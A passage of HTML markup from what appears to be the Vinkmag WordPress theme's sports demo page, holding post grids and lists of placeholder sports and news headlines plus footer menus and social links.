                                            <h4 class="post-title">
                                                Backward leg allows young cancer survivor to dance                                            </h4>
                                        </div>
                                    </div>
                                </a>
                            </li>
                                                    <li class="">
                                <a href="http://vinkmag.xpeedstudio.com/sports/#video-tab-f8d7cd0-3" data-toggle="tab">
                                    <div class="post-content media">
                                        <img class="d-flex sidebar-img mCS_img_loaded" src="{THEMES_PAGE}/assets/css/music1-455x300.jpg" alt="Tesla just lost its head of global just finance">
                                        <div class="media-body align-self-center">
                                            <h4 class="post-title">
                                                Tesla just lost its head of global just finance                                            </h4>
                                        </div>
                                    </div>
                                </a>
                            </li>
                                                    <li class="">
                                <a href="http://vinkmag.xpeedstudio.com/sports/#video-tab-f8d7cd0-4" data-toggle="tab">
                                    <div class="post-content media">
                                        <img class="d-flex sidebar-img mCS_img_loaded" src="{THEMES_PAGE}/assets/css/default_thumb.jpg" alt="They’re back! Kennedy Darling,named to return to">
                                        <div class="media-body align-self-center">
                                            <h4 class="post-title">
                                                They’re back! Kennedy Darling,named to return to                                            </h4>
                                        </div>
                                    </div>
                                </a>
                            </li>
                                                    <li class="">
                                <a href="http://vinkmag.xpeedstudio.com/sports/#video-tab-f8d7cd0-5" data-toggle="tab">
                                    <div class="post-content media">
                                        <img class="d-flex sidebar-img mCS_img_loaded" src="{THEMES_PAGE}/assets/css/health9-455x300.jpg" alt="Plans to ride out Hurricane the Florence on a boat">
                                        <div class="media-body align-self-center">
                                            <h4 class="post-title">
                                                Plans to ride out Hurricane the Florence on a boat                                            </h4>
                                        </div>
                                    </div>
                                </a>
                            </li>
                                                    <li class="">
                                <a href="http://vinkmag.xpeedstudio.com/sports/#video-tab-f8d7cd0-6" data-toggle="tab">
                                    <div class="post-content media">
                                        <img class="d-flex sidebar-img mCS_img_loaded" src="{THEMES_PAGE}/assets/css/health7-455x300.jpg" alt="Theye back return to you Kennedy Darlings">
                                        <div class="media-body align-self-center">
                                            <h4 class="post-title">
                                                Theye back return to you Kennedy Darlings                                            </h4>
                                        </div>
                                    </div>
                                </a>
                            </li>
                                                </ul>
                    </div><div id="mCSB_1_scrollbar_vertical" class="mCSB_scrollTools mCSB_1_scrollbar mCS-light mCSB_scrollTools_vertical" style="display: block;"><a href="http://vinkmag.xpeedstudio.com/sports/#" class="mCSB_buttonUp" oncontextmenu="return false;" style="display: block;"></a><div class="mCSB_draggerContainer"><div id="mCSB_1_dragger_vertical" class="mCSB_dragger" style="position: absolute; min-height: 30px; display: block; height: 255px; max-height: 340px; top: 0px;" oncontextmenu="return false;"><div class="mCSB_dragger_bar" style="line-height: 30px;"></div></div><div class="mCSB_draggerRail"></div></div><a href="http://vinkmag.xpeedstudio.com/sports/#" class="mCSB_buttonDown" oncontextmenu="return false;" style="display: block;"></a></div></div></div>
                </div>
            </div>
        
      		</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="67355ce" class="elementor-element elementor-element-67355ce elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
				<div class="elementor-row">
				<div data-id="bfeff20" class="elementor-element elementor-element-bfeff20 elementor-column elementor-col-25 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="113a319" class="elementor-element elementor-element-113a319 elementor-widget elementor-widget-vinazine-post-grid" data-element_type="vinazine-post-grid.default">
				<div class="elementor-widget-container">
			        
                              <div class="grid-item grid-sm ">
                                            <div class="ts-overlay-style featured-post post-184 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sketing category-sports">
   <div class="item item-before" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports4-600x398.jpg)">
      <div class="gradient-overlay"></div>
      <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2019/01/05/vontae-davis-quit-on-the-bills-at-halftime-changed-into/"></a>
      <div class="ts-post-thumb">
               </div>
      <div class="overlay-post-content">
         <div class="post-content">
            <h3 class="post-title">
               <a href="http://vinkmag.xpeedstudio.com/sports/2019/01/05/vontae-davis-quit-on-the-bills-at-halftime-changed-into/">
               Vontae Davis Quit on the Bills at...               </a>
            </h3>
            <ul class="post-meta-info">
                                             <li>
                  <i class="fa fa-clock-o"></i>January 5, 2019               </li>
               
                           </ul>
         </div>
      </div>
   </div>
</div>
                        
                    

                  </div>
                    


      		</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="c9d2bac" class="elementor-element elementor-element-c9d2bac elementor-column elementor-col-25 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="0424abb" class="elementor-element elementor-element-0424abb elementor-widget elementor-widget-vinazine-post-grid" data-element_type="vinazine-post-grid.default">
				<div class="elementor-widget-container">
			        
                              <div class="grid-item grid-sm ">
                                            <div class="ts-overlay-style featured-post post-4154 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sports category-surfing">
   <div class="item item-before" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/health7-600x398.jpg)">
      <div class="gradient-overlay"></div>
      <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/"></a>
      <div class="ts-post-thumb">
               </div>
      <div class="overlay-post-content">
         <div class="post-content">
            <h3 class="post-title">
               <a href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/">
               Marriott has new rewards offerings and you don’t need               </a>
            </h3>
            <ul class="post-meta-info">
                                             <li>
                  <i class="fa fa-clock-o"></i>March 1, 2018               </li>
               
                           </ul>
         </div>
      </div>
   </div>
</div>
                        
                    

                  </div>
                    


      		</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="4e36e30" class="elementor-element elementor-element-4e36e30 elementor-column elementor-col-25 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="285ac0c" class="elementor-element elementor-element-285ac0c elementor-widget elementor-widget-vinazine-post-grid" data-element_type="vinazine-post-grid.default">
				<div class="elementor-widget-container">
			        
                              <div class="grid-item grid-sm ">
                                            <div class="ts-overlay-style featured-post post-186 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-sketing category-sports category-surfing tag-sports">
   <div class="item item-before" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports2-600x398.jpg)">
      <div class="gradient-overlay"></div>
      <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/186/"></a>
      <div class="ts-post-thumb">
               </div>
      <div class="overlay-post-content">
         <div class="post-content">
            <h3 class="post-title">
               <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/186/">
               Youth vaping an epidemic with crackdown...               </a>
            </h3>
            <ul class="post-meta-info">
                                             <li>
                  <i class="fa fa-clock-o"></i>December 7, 2018               </li>
               
                           </ul>
         </div>
      </div>
   </div>
</div>
                        
                    

                  </div>
                    


      		</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="017e8ec" class="elementor-element elementor-element-017e8ec elementor-column elementor-col-25 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="39f85e2" class="elementor-element elementor-element-39f85e2 elementor-widget elementor-widget-vinazine-post-grid" data-element_type="vinazine-post-grid.default">
				<div class="elementor-widget-container">
			        
                              <div class="grid-item grid-sm ">
                                            <div class="ts-overlay-style featured-post post-158 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sketing category-sports category-surfing tag-sports">
   <div class="item item-before" style="background-image:url(http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports5-600x398.jpg)">
      <div class="gradient-overlay"></div>
      <a class="img-link" href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/"></a>
      <div class="ts-post-thumb">
               </div>
      <div class="overlay-post-content">
         <div class="post-content">
            <h3 class="post-title">
               <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/">
               The clock is ticking for e-cig companies...               </a>
            </h3>
            <ul class="post-meta-info">
                                             <li>
                  <i class="fa fa-clock-o"></i>December 7, 2018               </li>
               
                           </ul>
         </div>
      </div>
   </div>
</div>
                        
                    

                  </div>
                    


      		</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="9f5b354" class="elementor-element elementor-element-9f5b354 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
				<div class="elementor-row">
				<div data-id="5d7b65f" class="elementor-element elementor-element-5d7b65f elementor-column elementor-col-100 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="aa37d6d" class="elementor-element elementor-element-aa37d6d elementor-hidden-tablet elementor-hidden-phone elementor-widget elementor-widget-image" data-element_type="image.default">
				<div class="elementor-widget-container">
					<div class="elementor-image">
										<img width="970" height="90" src="{THEMES_PAGE}/assets/css/redad.png" class="attachment-full size-full" alt="" srcset="http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/12/redad.png 970w, http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/12/redad-300x28.png 300w, http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/12/redad-768x71.png 768w" sizes="(max-width: 970px) 100vw, 970px">											</div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="602a3a1" class="elementor-element elementor-element-602a3a1 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
				<div class="elementor-row">
				<div data-id="63b26e0" class="elementor-element elementor-element-63b26e0 elementor-column elementor-col-33 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="98546b4" class="elementor-element elementor-element-98546b4 elementor-widget elementor-widget-vinazine-post-list" data-element_type="vinazine-post-list.default">
				<div class="elementor-widget-container">
			        
                                                    <div class="widgets ts-grid-box widgets-populer-post  grid-no-shadow">
                                                                    
                                    

                                        <div class="item grid-md ">
                                            <div class="ts-overlay-style post-190 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-sketing category-sports tag-sports">
	<div class="item">
		<div class="ts-post-thumb">
			 
								<a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
					Cricket				</a>
						<a href="http://vinkmag.xpeedstudio.com/sports/2018/01/07/plans-to-ride-out-hurricane-the-florence-on-a-boat/">
					<img width="850" height="560" src="{THEMES_PAGE}/assets/css/sports1.jpg" class="attachment-full size-full wp-post-image" alt="" srcset="http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports1.jpg 850w, http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports1-300x198.jpg 300w, http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports1-768x506.jpg 768w" sizes="(max-width: 850px) 100vw, 850px">         </a>
       
		</div>
		<div class="overlay-post-content">
			<div class="post-content">
				<h3 class="post-title">
					<a href="http://vinkmag.xpeedstudio.com/sports/2018/01/07/plans-to-ride-out-hurricane-the-florence-on-a-boat/">plans to ride out Hurricane the Florence on a boat</a>
				</h3>
				<ul class="post-meta-info">
															<li>
						<i class="fa fa-clock-o"></i>January 7, 2018					</li>
                              
               
				</ul>
			</div>
		</div>
	</div>
</div>                                        </div>
                                                                                                                                                <div class="post-content media">
                                            <a href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/">
                                                <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/health7-455x300.jpg" alt="Marriott has new rewards offerings and you don’t need">
                                            </a>
                                            
                                            <div class="media-body ">
                                                <h4 class="post-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/03/01/marriott-has-new-rewards-offerings-and-you-dont-need/">  Marriott has new rewards offerings and you don’t need</a>
                                                 
                                                </h4>
                                                                                                   <span class="post-date-info">
                                                      <i class="fa fa-clock-o"></i>
                                                      March 1, 2018                                                   </span>
                                                                                            
                                            </div>
                                        </div>
                                                                                                                                                <div class="post-content media">
                                            <a href="http://vinkmag.xpeedstudio.com/sports/2018/04/08/the-clock-is-ticking-for-e-cig-companies-underage-users-2/">
                                                <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/sports3-455x300.jpg" alt="Clock is companies underage ticking for e-cig  users">
                                            </a>
                                            
                                            <div class="media-body ">
                                                <h4 class="post-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/04/08/the-clock-is-ticking-for-e-cig-companies-underage-users-2/">  Clock is companies underage ticking for e-cig users</a>
                                                 
                                                </h4>
                                                                                                   <span class="post-date-info">
                                                      <i class="fa fa-clock-o"></i>
                                                      April 8, 2018                                                   </span>
                                                                                            
                                            </div>
                                        </div>
                                                                                                                                                <div class="post-content media">
                                            <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/">
                                                <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/sports5-455x300.jpg" alt="The clock is ticking for e-cig companies underage users">
                                            </a>
                                            
                                            <div class="media-body ">
                                                <h4 class="post-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/">  The clock is ticking for e-cig companies underage users</a>
                                                 
                                                </h4>
                                                                                                   <span class="post-date-info">
                                                      <i class="fa fa-clock-o"></i>
                                                      December 7, 2018                                                   </span>
                                                                                            
                                            </div>
                                        </div>
                                                                                                </div>
                                      		</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="6f63593" class="elementor-element elementor-element-6f63593 elementor-column elementor-col-33 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="ba60484" class="elementor-element elementor-element-ba60484 elementor-widget elementor-widget-vinazine-post-list" data-element_type="vinazine-post-list.default">
				<div class="elementor-widget-container">
			        
                                                    <div class="widgets ts-grid-box widgets-populer-post  grid-no-shadow">
                                                                    
                                    

                                        <div class="item grid-md ">
                                            <div class="ts-overlay-style post-184 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-football category-sketing category-sports">
	<div class="item">
		<div class="ts-post-thumb">
			 
								<a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
					Cricket				</a>
						<a href="http://vinkmag.xpeedstudio.com/sports/2019/01/05/vontae-davis-quit-on-the-bills-at-halftime-changed-into/">
					<img width="850" height="560" src="{THEMES_PAGE}/assets/css/sports4.jpg" class="attachment-full size-full wp-post-image" alt="" srcset="http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports4.jpg 850w, http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports4-300x198.jpg 300w, http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports4-768x506.jpg 768w" sizes="(max-width: 850px) 100vw, 850px">         </a>
       
		</div>
		<div class="overlay-post-content">
			<div class="post-content">
				<h3 class="post-title">
					<a href="http://vinkmag.xpeedstudio.com/sports/2019/01/05/vontae-davis-quit-on-the-bills-at-halftime-changed-into/">Vontae Davis Quit on the Bills at Halftime, Changed into</a>
				</h3>
				<ul class="post-meta-info">
															<li>
						<i class="fa fa-clock-o"></i>January 5, 2019					</li>
                              
               
				</ul>
			</div>
		</div>
	</div>
</div>                                        </div>
                                                                                                                                                <div class="post-content media">
                                            <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/186/">
                                                <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/sports2-455x300.jpg" alt="Youth vaping an epidemic with crackdown coming">
                                            </a>
                                            
                                            <div class="media-body ">
                                                <h4 class="post-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/186/">  Youth vaping an epidemic with crackdown coming</a>
                                                 
                                                </h4>
                                                                                                   <span class="post-date-info">
                                                      <i class="fa fa-clock-o"></i>
                                                      December 7, 2018                                                   </span>
                                                                                            
                                            </div>
                                        </div>
                                                                                                                                                <div class="post-content media">
                                            <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/how-did-it-go-so-wrong-for-ferrari-in-singapore/">
                                                <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/sports4-455x300.jpg" alt="How did it go so wrong for Ferrari in Singapore?">
                                            </a>
                                            
                                            <div class="media-body ">
                                                <h4 class="post-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/how-did-it-go-so-wrong-for-ferrari-in-singapore/">  How did it go so wrong for Ferrari in Singapore?</a>
                                                 
                                                </h4>
                                                                                                   <span class="post-date-info">
                                                      <i class="fa fa-clock-o"></i>
                                                      December 7, 2018                                                   </span>
                                                                                            
                                            </div>
                                        </div>
                                                                                                                                                <div class="post-content media">
                                            <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/">
                                                <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/sports5-455x300.jpg" alt="The clock is ticking for e-cig companies underage users">
                                            </a>
                                            
                                            <div class="media-body ">
                                                <h4 class="post-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/">  The clock is ticking for e-cig companies underage users</a>
                                                 
                                                </h4>
                                                                                                   <span class="post-date-info">
                                                      <i class="fa fa-clock-o"></i>
                                                      December 7, 2018                                                   </span>
                                                                                            
                                            </div>
                                        </div>
                                                                                                </div>
                                      		</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="9f8def4" class="elementor-element elementor-element-9f8def4 elementor-column elementor-col-33 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="0f80ab2" class="elementor-element elementor-element-0f80ab2 elementor-widget elementor-widget-vinazine-post-list" data-element_type="vinazine-post-list.default">
				<div class="elementor-widget-container">
			        
                                                    <div class="widgets ts-grid-box widgets-populer-post  grid-no-shadow">
                                                                    
                                    
      <h2 class="ts-title block-title-style1 float-left">
      <span class="title-before"></span>
      Latest Post      </h2>
                     <div class="clearfix"></div>
            

                                        <div class="item grid-sm ">
                                            <div class="ts-overlay-style post-186 post type-post status-publish format-standard has-post-thumbnail hentry category-cricket category-sketing category-sports category-surfing tag-sports">
	<div class="item">
		<div class="ts-post-thumb">
			 
								<a class="post-cat" href="http://vinkmag.xpeedstudio.com/sports/category/cricket/" style="color:#ffffff; background-color:#d72924; border-left-color:#d72924">
					Cricket				</a>
						<a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/186/">
					<img width="850" height="560" src="{THEMES_PAGE}/assets/css/sports2.jpg" class="attachment-full size-full wp-post-image" alt="" srcset="http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports2.jpg 850w, http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports2-300x198.jpg 300w, http://vinkmag.xpeedstudio.com/sports/wp-content/uploads/sites/8/2018/10/sports2-768x506.jpg 768w" sizes="(max-width: 850px) 100vw, 850px">         </a>
       
		</div>
		<div class="overlay-post-content">
			<div class="post-content">
				<h3 class="post-title">
					<a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/186/">Youth vaping an epidemic with crackdown coming</a>
				</h3>
				<ul class="post-meta-info">
															<li>
						<i class="fa fa-clock-o"></i>December 7, 2018					</li>
                              
               
				</ul>
			</div>
		</div>
	</div>
</div>                                        </div>
                                                                                                                                                <div class="post-content media">
                                            <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/">
                                                <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/sports5-455x300.jpg" alt="The clock is ticking for e-cig companies underage users">
                                            </a>
                                            
                                            <div class="media-body ">
                                                <h4 class="post-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/the-clock-is-ticking-for-e-cig-companies-underage-users/">  The clock is ticking for e-cig...</a>
                                                 
                                                </h4>
                                                                                                   <span class="post-date-info">
                                                      <i class="fa fa-clock-o"></i>
                                                      December 7, 2018                                                   </span>
                                                                                            
                                            </div>
                                        </div>
                                                                                                                                                <div class="post-content media">
                                            <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/how-did-it-go-so-wrong-for-ferrari-in-singapore/">
                                                <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/sports4-455x300.jpg" alt="How did it go so wrong for Ferrari in Singapore?">
                                            </a>
                                            
                                            <div class="media-body ">
                                                <h4 class="post-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2018/12/07/how-did-it-go-so-wrong-for-ferrari-in-singapore/">  How did it go so wrong...</a>
                                                 
                                                </h4>
                                                                                                   <span class="post-date-info">
                                                      <i class="fa fa-clock-o"></i>
                                                      December 7, 2018                                                   </span>
                                                                                            
                                            </div>
                                        </div>
                                                                                                                                                <div class="post-content media">
                                            <a href="http://vinkmag.xpeedstudio.com/sports/2019/01/05/vontae-davis-quit-on-the-bills-at-halftime-changed-into/">
                                                <img class="d-flex sidebar-img" src="{THEMES_PAGE}/assets/css/sports4-455x300.jpg" alt="Vontae Davis Quit on the Bills at Halftime, Changed into">
                                            </a>
                                            
                                            <div class="media-body ">
                                                <h4 class="post-title">
                                                    <a href="http://vinkmag.xpeedstudio.com/sports/2019/01/05/vontae-davis-quit-on-the-bills-at-halftime-changed-into/">  Vontae Davis Quit on the Bills...</a>
                                                 
                                                </h4>
                                                                                                   <span class="post-date-info">
                                                      <i class="fa fa-clock-o"></i>
                                                      January 5, 2019                                                   </span>
                                                                                            
                                            </div>
                                        </div>
                                                                                                </div>
                                      		</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
		
    		<footer id="ekit-footer">
			<div class="footer-width-fixer">		<div data-elementor-type="post" data-elementor-id="4128" class="elementor elementor-4128" data-elementor-settings="[]">
			<div class="elementor-inner">
				<div class="elementor-section-wrap">
							<section data-id="a77fae8" class="elementor-element elementor-element-a77fae8 custom-footer-menu elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
				<div class="elementor-row">
				<div data-id="a847e29" class="elementor-element elementor-element-a847e29 elementor-column elementor-col-33 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="75c0cd6" class="elementor-element elementor-element-75c0cd6 footer-menu xs-center elementor-widget elementor-widget-wp-widget-nav_menu" data-element_type="wp-widget-nav_menu.default">
				<div class="elementor-widget-container">
			<div class="menu-footer-left-menu-container"><ul id="menu-footer-left-menu" class="menu"><li id="menu-item-4381" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-1515 current_page_item menu-item-4381"><a href="http://vinkmag.xpeedstudio.com/sports/">Home</a></li>
<li id="menu-item-4382" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4382"><a href="http://vinkmag.xpeedstudio.com/sports/category/cricket/">Cricket</a></li>
<li id="menu-item-4383" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4383"><a href="http://vinkmag.xpeedstudio.com/sports/category/football/">Football</a></li>
</ul></div>		</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="3902c0d" class="elementor-element elementor-element-3902c0d elementor-column elementor-col-33 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="eaa65e6" class="elementor-element elementor-element-eaa65e6 elementor-widget elementor-widget-vinazine-logo" data-element_type="vinazine-logo.default">
				<div class="elementor-widget-container">
			    <div class="vinkmag-widget-logo">
        <a href="http://vinkmag.xpeedstudio.com/sports/">
            <img src="{THEMES_PAGE}/assets/images/header_logo.png" alt="Sports">
        </a>
    </div>

    		</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="f2698d0" class="elementor-element elementor-element-f2698d0 elementor-column elementor-col-33 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="abb41e3" class="elementor-element elementor-element-abb41e3 footer-menu text-right xs-center elementor-widget elementor-widget-wp-widget-nav_menu" data-element_type="wp-widget-nav_menu.default">
				<div class="elementor-widget-container">
			<div class="menu-footer-right-menu-container"><ul id="menu-footer-right-menu" class="menu"><li id="menu-item-4385" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4385"><a href="http://vinkmag.xpeedstudio.com/sports/category/sketing/">Sketing</a></li>
<li id="menu-item-4386" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4386"><a href="http://vinkmag.xpeedstudio.com/sports/category/video/">Video</a></li>
<li id="menu-item-4387" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4387"><a href="http://vinkmag.xpeedstudio.com/sports/category/surfing/">Surfing</a></li>
</ul></div>		</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="f15e381" class="elementor-element elementor-element-f15e381 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
				<div class="elementor-row">
				<div data-id="3a37ac0" class="elementor-element elementor-element-3a37ac0 elementor-column elementor-col-33 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="5a5f4e5" class="elementor-element elementor-element-5a5f4e5 xs-center elementor-widget elementor-widget-text-editor" data-element_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>© Vinkmag Sports, 2018</p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="2dc6ff7" class="elementor-element elementor-element-2dc6ff7 elementor-column elementor-col-33 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="27d232a" class="elementor-element elementor-element-27d232a elementor-shape-rounded elementor-widget elementor-widget-social-icons" data-element_type="social-icons.default">
				<div class="elementor-widget-container">
					<div class="elementor-social-icons-wrapper">
							<a class="elementor-icon elementor-social-icon elementor-social-icon-facebook" href="http://vinkmag.xpeedstudio.com/sports/" target="_blank">
					<span class="elementor-screen-only">Facebook</span>
					<i class="fa fa-facebook"></i>
				</a>
							<a class="elementor-icon elementor-social-icon elementor-social-icon-twitter" href="http://vinkmag.xpeedstudio.com/sports/" target="_blank">
					<span class="elementor-screen-only">Twitter</span>
					<i class="fa fa-twitter"></i>
				</a>
							<a class="elementor-icon elementor-social-icon elementor-social-icon-google-plus" href="http://vinkmag.xpeedstudio.com/sports/" target="_blank">
					<span class="elementor-screen-only">Google-plus</span>
					<i class="fa fa-google-plus"></i>
				</a>
							<a class="elementor-icon elementor-social-icon elementor-social-icon-youtube" href="http://vinkmag.xpeedstudio.com/sports/" target="_blank">
					<span class="elementor-screen-only">Youtube</span>
					<i class="fa fa-youtube"></i>
				</a>
							<a class="elementor-icon elementor-social-icon elementor-social-icon-tumblr" href="http://vinkmag.xpeedstudio.com/sports/" target="_blank">
					<span class="elementor-screen-only">Tumblr</span>
					<i class="fa fa-tumblr"></i>
				</a>
							<a class="elementor-icon elementor-social-icon elementor-social-icon-instagram" href="http://vinkmag.xpeedstudio.com/sports/" target="_blank">
					<span class="elementor-screen-only">Instagram</span>
					<i class="fa fa-instagram"></i>
				</a>
					</div>
				</div>
				</div>
						</div>
			</div>
		</div>
				<div data-id="c802d28" class="elementor-element elementor-element-c802d28 elementor-column elementor-col-33 elementor-top-column" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div data-id="04887d6" class="elementor-element elementor-element-04887d6 footer-menu text-right xs-center elementor-widget elementor-widget-wp-widget-nav_menu" data-element_type="wp-widget-nav_menu.default">
				<div class="elementor-widget-container">
			<div class="menu-footer-menu-container"><ul id="menu-footer-menu" class="menu"><li id="menu-item-4388" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4388"><a href="http://vinkmag.xpeedstudio.com/sports/category/sports/">Sports</a></li>
<li id="menu-item-4424" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4424"><a href="http://vinkmag.xpeedstudio.com/sports/category/cricket/">Cricket</a></li>
<li id="menu-item-4425" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4425"><a href="http://vinkmag.xpeedstudio.com/sports/category/feature/">Racing</a></li>
</ul></div>		</div>
				</div>
						</div>
